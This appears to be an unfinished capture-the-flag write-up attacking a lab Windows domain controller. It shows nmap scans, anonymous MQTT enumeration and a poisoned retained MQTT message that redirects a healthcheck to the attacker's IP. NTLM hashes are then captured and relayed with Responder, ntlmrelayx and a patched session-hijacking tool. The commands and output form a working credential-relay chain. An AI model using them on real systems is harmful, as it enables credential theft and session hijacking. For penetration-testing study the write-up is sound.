
| Property         | Value                    |
| ---------------- | ------------------------ |
| **OS**           | Windows                  |
| **Difficulty**   | Hard                     |
| **Release Date** | YYYY-MM-DD               |
| **State**        | YYYY-MM-DD               |
| **IP**           | 10.10.10.X               |
| **Techniques**   | technique-1, technique-2 |
| **Tags**         | #web #privesc #linux     |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
 sudo nmap -sC -sV 10.129.188.129 --open    
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 06:13 EDT
Nmap scan report for 10.129.188.129
Host is up (0.051s latency).
Not shown: 986 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ghost Protocol Zero
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-29 18:14:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-29T18:14:48
|_  start_date: N/A
|_clock-skew: 8h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.84 seconds

```

```
sudo nmap -p- 10.129.188.129 --open        
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 06:14 EDT
Nmap scan report for 10.129.188.129
Host is up (0.049s latency).
Not shown: 65511 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1883/tcp  open  mqtt
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49904/tcp open  unknown
49921/tcp open  unknown
51226/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 131.91 seconds

```

```
sudo nmap -sCV -p 1883 10.129.188.129 --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 06:16 EDT
Nmap scan report for 10.129.188.129
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
1883/tcp open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/brokers/client_status/mqttui-fe5834be: {"status":"offline", "username":"(null)","ts":1793297823673,"reason_code":"0","client_id":"mqttui-fe5834be","IPv4":"127.0.0.1"}
|     $SYS/brokers/client_status/mqttui-82e3bef7: {"status":"online", "username":"(null)", "ts":1793297825758,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-82e3bef7","clean_start":1, "IPv4":"127.0.0.1"}
|_    $SYS/brokers/client_status/mqttui-6b8479: {"status":"offline", "username":"(null)","ts":1793297821599,"reason_code":"0","client_id":"mqttui-6b8479","IPv4":"127.0.0.1"}

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds

```

added to /etc/hosts

```
10.129.188.129 ghostlink.htb dc01.ghostlink.htb dc01
```

### MTTQ Enumeration

https://hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html

```bash
apt-get install mosquitto mosquitto-clients
```

```
mosquitto_sub -h ghostlink.htb -t "#" -v
```

```
GhostProtocolZero/energy/grid/frequency {"timestamp":"2026-29-10-21:24:13","node":"node-2","telemetry":{"ip":"10.2.45.56","loadPercent":40,"hz":74252576.9}}
GhostProtocolZero/identity/trust-provider/state {"timestamp":"2026-29-10-21:24:13","node":"node-1","telemetry":{"ip":"10.1.12.34","tokenValidation":"delayed","authErrors":2}}
GhostProtocolZero/network/node/healthcheck {"timestamp":"2026-29-10-21:24:13","node":"node-3","telemetry":{"healthy":true,"url":"https://transport.ghostlink.htb/keepalive","lastCheckSecAgo":22,"ip":"10.4.23.11"}}
GhostProtocolZero/network/node/keepalive {"timestamp":"2026-29-10-21:24:13","node":"node-1","telemetry":{"rttMs":66,"status":"error","url":"https://core-telecom.ghostlink.htb/keepalive","ip":"10.1.12.34"}}
GhostProtocolZero/space/satellite/timing-drift {"timestamp":"2026-29-10-21:24:13","node":"node-3","telemetry":{"driftNs":219,"ip":"10.4.23.11","syncState":"resync"}}
GhostProtocolZero/telecom/core-routing/health {"timestamp":"2026-29-10-21:24:13","node":"node-1","telemetry":{"ip":"10.1.12.34","packetLoss":1276077930,"routeStability":"stable"}}
GhostProtocolZero/transport/logistics/status {"timestamp":"2026-29-10-21:24:13","node":"node-2","telemetry":{"throughput":73,"anomaly":"reroute","ip":"10.2.45.56"}}
GhostProtocolZero/systems/node/domain/healthcheck {"timestamp":"2026-29-10-21:24:26","node":"node-4","telemetry":{"healthy":true,"url":"dc01.ghostlink.htb/healthcheck","latencyMs":243,"ip":"10.129.189.74"}}
GhostProtocolZero/systems/node/repository/healthcheck {"timestamp":"2026-29-10-21:24:26","node":"node-5","telemetry":{"healthy":true,"url":"gpz-op26-toolkits.ghostlink.htb/healthcheck","lastCheckSecAgo":31,"responseCode":"200","ip":"172.16.20.20"}}
GhostProtocolZero/systems/node/secureshare/healthcheck {"timestamp":"2026-29-10-21:24:27","node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","lastCheckSecAgo":42,"responseCode":"200","ip":"172.16.20.10"}}
```

- **Anonymous access:** the broker accepts unauthenticated subscriptions to `#` (`username: (null)`).
- **Hostnames leaked:** `transport.ghostlink.htb`, `core-telecom.ghostlink.htb`, `dc01.ghostlink.htb`, `gpz-op26-toolkits.ghostlink.htb`, `gpz-op26-secure.ghostlink.htb`.
- **Internal IPs:** `10.1.12.34`, `10.2.45.56`, `10.4.23.11`, `10.129.189.74` (dc01), `172.16.20.20` (toolkits), `172.16.20.10` (secure share).

### MQTT topics and nodes

| Topic                                                    | Node   | Node IP       | Notable telemetry                                                               |
| -------------------------------------------------------- | ------ | ------------- | ------------------------------------------------------------------------------- |
| `GhostProtocolZero/energy/grid/frequency`                | node-2 | 10.2.45.56    | loadPercent 40, hz 74252576.9 (implausible value)                               |
| `GhostProtocolZero/identity/trust-provider/state`        | node-1 | 10.1.12.34    | tokenValidation “delayed”, authErrors 2                                         |
| `GhostProtocolZero/network/node/healthcheck`             | node-3 | 10.4.23.11    | healthy true, checks `https://transport.ghostlink.htb/keepalive`                |
| `GhostProtocolZero/network/node/keepalive`               | node-1 | 10.1.12.34    | status “error”, rttMs 66, checks `https://core-telecom.ghostlink.htb/keepalive` |
| `GhostProtocolZero/space/satellite/timing-drift`         | node-3 | 10.4.23.11    | driftNs 219, syncState “resync”                                                 |
| `GhostProtocolZero/telecom/core-routing/health`          | node-1 | 10.1.12.34    | packetLoss 1276077930 (implausible value), routeStability “stable”              |
| `GhostProtocolZero/transport/logistics/status`           | node-2 | 10.2.45.56    | throughput 73, anomaly “reroute”                                                |
| `GhostProtocolZero/systems/node/domain/healthcheck`      | node-4 | 10.129.189.74 | healthy true, latencyMs 243                                                     |
| `GhostProtocolZero/systems/node/repository/healthcheck`  | node-5 | 172.16.20.20  | healthy true, responseCode 200                                                  |
| `GhostProtocolZero/systems/node/secureshare/healthcheck` | node-6 | 172.16.20.10  | healthy true, responseCode 200                                                  |
### Hosts discovered

| Hostname                          | IP            | Source topic                           |
| --------------------------------- | ------------- | -------------------------------------- |
| `dc01.ghostlink.htb`              | 10.129.189.74 | `systems/node/domain/healthcheck`      |
| `gpz-op26-toolkits.ghostlink.htb` | 172.16.20.20  | `systems/node/repository/healthcheck`  |
| `gpz-op26-secure.ghostlink.htb`   | 172.16.20.10  | `systems/node/secureshare/healthcheck` |
| `transport.ghostlink.htb`         | not disclosed | `network/node/healthcheck` (node-3)    |
| `core-telecom.ghostlink.htb`      | not disclosed | `network/node/keepalive` (node-1)      |

## Publish 

```
mosquitto_pub -h ghostlink.htb -t 'test/injection' -r -m 'pentest'
```

```
mosquitto_sub -h ghostlink.htb -t 'test/injection' -v -W 2        
test/injection pentest
Timed out

```

## NTLM Relay

```
mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m '{"timestamp":"2026-29-10-21:24:26","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148:8888/healthcheck","latencyMs":243,"ip":"10.129.189.74"}}'
                                                                 
```

```
impacket-ntlmrelayx -t ldap://10.129.189.74 --http-port 8888 -smb2support
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 8888
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
^C                                                                                      
```

Attack failed but discovered a user


trying with responder and setting the ip address 172.16.20.10 (`systems/node/secureshare/healthcheck`)

```
sudo responder -I tun0
```

```bash
mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m '{"timestamp":"2026-29-10-21:24:27","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148/healthcheck","lastCheckSecAgo":42,"responseCode":"200","ip":"172.16.20.10"}}' 
```

```
[+] Listening for events...                                                                                         

[HTTP] NTLMv2 Client   : 10.129.189.74
[HTTP] NTLMv2 Username : ghostlink\svc_canary
[HTTP] NTLMv2 Hash     : svc_canary::ghostlink:afdbf9989345f00d:319C8080BFC4AB1CD3948BEF95E05C9C:0101000000000000F3A75D113568DD01767DD94FC72611DA00000000020008004200510036004B0001001E00570049004E002D0058003200460035004A005A0032005300530059004A00040014004200510036004B002E004C004F00430041004C0003003400570049004E002D0058003200460035004A005A0032005300530059004A002E004200510036004B002E004C004F00430041004C00050014004200510036004B002E004C004F00430041004C000800500050000000000000000000000000400000E18E8969BA1E95C7DF3D5DAEB3CFABE1EA986B2966C195F17A21E8739BA1403F9EA6E0B56B1FC312F086641EDEA22BE27F255F4E3441AFE2B8AB0BC43190031D0A001000000000000000000000000000000000000900220048005400540050002F00310030002E00310030002E00310034002E003100340038000000000000000000                                                           
[+] Exiting...

```


```
hashcat -m 5600 svc_canary.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1468/2937 MB (1468 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1155 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC_CANARY::ghostlink:afdbf9989345f00d:319c8080bfc4...000000
Time.Started.....: Thu Oct 29 18:16:06 2026 (9 secs)
Time.Estimated...: Thu Oct 29 18:16:15 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1714.5 kH/s (1.91ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 82%

Started: Thu Oct 29 18:15:50 2026
Stopped: Thu Oct 29 18:16:16 2026

```

does not crack.

enumerating gogs

img

commit in source code

```
curl -s http://gpz-op26-toolkits.ghostlink.htb/user/login | grep -i -E "gogs|version"
                <meta name="author" content="Gogs" />
                <meta name="description" content="Gogs is a painless self-hosted Git service" />
                <meta name="keywords" content="go, git, self-hosted, gogs">
                <meta property="og:title" content="Gogs">
                <meta property="og:description" content="Gogs is a painless self-hosted Git service.">
                <meta property="og:site_name" content="Gogs">
        <link rel="stylesheet" href="/css/gogs.min.css?v=5084b4a9b77a506f5e287e82e945e1c6882b827a">
        <script src="/js/gogs.js?v=5084b4a9b77a506f5e287e82e945e1c6882b827a"></script>
        <title>Sign In - Gogs</title>
                                                                        <a class="item" target="_blank" rel="noopener noreferrer" href="https://gogs.io/docs" rel="noreferrer">Help</a>
                                © 2026 Gogs
                                <a target="_blank" rel="noopener noreferrer" href="https://gogs.io">Website</a>
                                                                                                              
```

navigating to

https://github.com/gogs/gogs/commit/5084b4a9b77a506f5e287e82e945e1c6882b827a

vulnerable version 

img

CVE-2025-8110 (RCE authenticated - Gravità Alta/Critica) 


## More relaying

```
 mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m '{"timestamp":"2026-29-10-21:24:27","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148:8888/healthcheck","lastCheckSecAgo":42,"responseCode":"200","ip":"172.16.20.10"}}'
```

```
python3 ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 --keep-relaying

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 8888
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
DEFAULT CASE
200 OK
b'<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="utf-8" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <meta name="description" content="Ghost Protocol Zero - Secure File Sharing" />\n    <base href="/" />\n    <link rel="stylesheet" href="lib/bootstrap/dist/css/bootstrap.min.css" />\n    <link rel="stylesheet" href="app.css" />\n    <link rel="icon" type="image/x-icon" href="favicon.png" />\n    <title>Ghost Protocol Zero | Secure Operations Channel</title>\n</head>\n\n<body>\n    <nav class="navbar">\n        <div class="nav-container">\n            <div class="nav-left">\n                <a href="/" class="nav-logo">\n                    <svg class="nav-logo-icon" width="33" height="33" viewBox="0 0 33 33" fill="none" xmlns="http://www.w3.org/2000/svg">\n                        <path d="M28 0H5C2.24 0 0 2.24 0 5v23c0 2.76 2.24 5 5 5h23c2.76 0 5-2.24 5-5V5c0-2.76-2.24-5-5-5ZM29 17c-6.63 0-12 5.37-12 12h-1c0-6.63-5.37-12-12-12v-1c6.63 0 12-5.37 12-12h1c0 6.63 5.37 12 12 12v1Z" fill="currentColor"/>\n                    </svg>\n                    <span class="nav-logo-text">Ghost Protocol Zero</span>\n                </a>\n            </div>\n            <div class="nav-right">\n                <a href="operation-briefing.pdf" download class="btn btn-primary">Latest Operation Briefing</a>\n            </div>\n        </div>\n    </nav>\n\n    <section class="hero-section">\n        <div class="container">\n            <div class="hero-grid">\n                <div class="hero-content">\n                    <h1 class="hero-heading">Influence comes from control.</h1>\n                    <p class="hero-subheading">Ghost Protocol Zero communications through classified channels. Task Force Nightfall is frequently deploying mass surveillance, our operational security is now of utmost importance. All uploads will be stored for 24hrs and encrypted at rest using the team leader\'s public key.</p>\n                    <button class="btn btn-primary btn-upload" id="toggleUploadBtn">\n                        Upload\n                    </button>\n                    \n                    <div id="uploadMessage" class="upload-message" style="display: none;"></div>\n                    \n                    <div id="shareLinkContainer" class="share-link-container" style="display: none;">\n                        <p class="share-label">Classified channel:</p>\n                        <div class="share-link-box">\n                            <input type="text" readonly id="shareLinkInput" class="share-link-input" />\n                            <button class="btn btn-copy" id="copyLinkBtn">Copy</button>\n                        </div>\n                    </div>\n                </div>\n                <div class="hero-image-wrapper">\n                    <div class="upload-zone-overlay" id="uploadZoneOverlay" style="display: none;">\n                        <div class="upload-zone">\n                            <div class="upload-zone-content">\n                                <svg class="upload-icon" width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">\n                                    <path d="M12 16V4M12 4L8 8M12 4L16 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\n                                    <path d="M4 14V18C4 19.1046 4.89543 20 6 20H18C19.1046 20 20 19.1046 20 18V14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\n                                </svg>\n                                <p class="upload-text">Drop classified intelligence here</p>\n                                <p class="upload-hint">Max file size: 5MB // No traceback</p>\n                                <input type="file" id="fileInput" multiple style="display: none;" />\n                                <label for="fileInput" class="btn btn-upload-browse">Browse Assets</label>\n                            </div>\n                        </div>\n                        \n                        <div id="selectedFilesList" class="selected-files-list" style="display: none;"></div>\n                    </div>\n                    <img src="images/hero-image.avif" \n                         alt="Team brainstorming in an office" \n                         class="hero-image" \n                         loading="lazy" />\n                    <div class="hero-overlay"></div>\n                </div>\n            </div>\n        </div>\n    </section>\n\n    <section class="features-section">\n        <div class="container">\n            <div class="features-header">\n                <h2 class="features-heading">Operational Security</h2>\n                <p class="features-subheading">Our objective is long-term access and credibility, our communications must remain invisible.</p>\n            </div>\n            <div class="features-grid">\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">Zero traceback</span>\n                            <h3 class="feature-title">No accounts. No logs. No identity.</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-1.avif" \n                             alt="Software security protocols" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">End-to-end encrypted</span>\n                            <h3 class="feature-title">Classified channels only</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-2.avif" \n                             alt="Cloud-based solutions interface" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">One-time links</span>\n                            <h3 class="feature-title">Ephemeral access. No persistent exposure.</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-3.avif" \n                             alt="Satellite communication service" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n            </div>\n        </div>\n    </section>\n\n    <script src="app.js"></script>\n</body>\n\n</html>\n'
^C                                                                                                                    

```

#### ghostsurf

[ghostsurf](https://github.com/senderend/ghostsurf) is a tool from SpecterOps used for this kind of relay hijack, describing itself as:

> NTLM HTTP relay tool with SOCKS proxy for browser session hijacking.
> 
> Capture NTLM auth, relay to HTTP/HTTPS targets, then browse as the victim through a SOCKS proxy. This works even when cookie replay doesn’t.
> 
> Blog: [ghostsurf: From NTLM Relay to Browser Session Hijacking](https://specterops.io/blog/2026/04/02/ghostsurf-from-ntlm-relay-to-browser-session-hijacking/)

```
python3 ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb --keep-relaying --kernel-auth --http-port 8888

  ,--,   .-. .-. .---.    .---.  _______  .---. .-. .-.,---.    ,---.
.' .'    | | | |/ .-. )  ( .-._)|__   __|( .-._)| | | || .-.\   | .-'
|  |  __ | `-' || | |(_)(_) \     )| |  (_) \   | | | || `-'/   | `-.
\  \ ( _)| .-. || | | | _  \ \   (_) |  _  \ \  | | | ||   (    | .-'
 \  `-) )| | |)|\ `-' /( `-'  )    | | ( `-'  ) | `-')|| |\ \   | |
 )\____/ /(  (_) )---'  `----'     `-'  `----'  `---(_)|_| \)\  )\|
(__)    (__)    (_)  NTLM relay browser session hijacking  (__)(__)


[*] Target: http://gpz-op26-secure.ghostlink.htb
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] SOCKS proxy: 127.0.0.1:1080
[*] Kernel-mode auth workaround ENABLED
[*] Keep-relaying mode ENABLED (will reload targets after success)
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 8888
 * Serving Flask app 'lib.relay.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ghostsurf> [*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[-] (HTTP): Exception while Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb: "'NTLMRelayxConfig' object has no attribute 'remove_target'"
[-] (HTTP): Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb failed
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[-] (HTTP): Exception while Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb: "'NTLMRelayxConfig' object has no attribute 'remove_target'"
[-] (HTTP): Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb failed
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[-] (HTTP): Exception while Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb: "'NTLMRelayxConfig' object has no attribute 'remove_target'"
[-] (HTTP): Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb failed
```

editing config.py

```
nano lib/relay/utils/config.py 
```

# Summary

This fixes an `AttributeError` during HTTP NTLM relay caused by a missing `remove_target` attribute in Ghostsurf's vendored `NTLMRelayxConfig`.

# Problem

During relay negotiation, Ghostsurf raised:

`AttributeError: 'NTLMRelayxConfig' object has no attribute 'remove_target'`

The vendored `NTLMRelayxConfig` initializes `remove_mic` but does not initialize `remove_target`, which is expected by the relay server.

# Fix

Initialize the missing `remove_target` attribute in `lib/relay/utils/config.py`:

`self.remove_target = False`

# Verification

After applying this change, relay negotiation completed successfully, authenticated HTTP SOCKS sessions were established, and browser session hijacking proceeded as expected.


```
python3 ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb --keep-relaying --kernel-auth --http-port 8888
```

```

  ,--,   .-. .-. .---.    .---.  _______  .---. .-. .-.,---.    ,---.
.' .'    | | | |/ .-. )  ( .-._)|__   __|( .-._)| | | || .-.\   | .-'
|  |  __ | `-' || | |(_)(_) \     )| |  (_) \   | | | || `-'/   | `-.
\  \ ( _)| .-. || | | | _  \ \   (_) |  _  \ \  | | | ||   (    | .-'
 \  `-) )| | |)|\ `-' /( `-'  )    | | ( `-'  ) | `-')|| |\ \   | |
 )\____/ /(  (_) )---'  `----'     `-'  `----'  `---(_)|_| \)\  )\|
(__)    (__)    (_)  NTLM relay browser session hijacking  (__)(__)


[*] Target: http://gpz-op26-secure.ghostlink.htb
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
